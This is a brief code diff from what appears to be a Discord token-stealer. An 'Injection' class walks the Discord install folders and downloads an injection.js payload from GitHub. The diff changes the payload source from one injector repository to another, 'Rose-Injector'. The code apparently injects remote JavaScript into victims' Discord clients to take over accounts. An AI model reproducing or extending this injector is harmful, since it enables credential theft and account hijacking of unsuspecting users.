@@ -894,7 +894,7 @@ class Injection():
             self.appdata + '\\DiscordPTB',
             self.appdata + '\\DiscordDevelopment'
         ]
-        self.code = requests.get("https://raw.githubusercontent.com/Smug246/luna-injection/main/injection.js").text
+        self.code = requests.get("https://raw.githubusercontent.com/Gum-s/Rose-Injector/main/injection/injection.js").text
 
         for dir in self.discord_dirs:
             if not os.path.exists(dir):
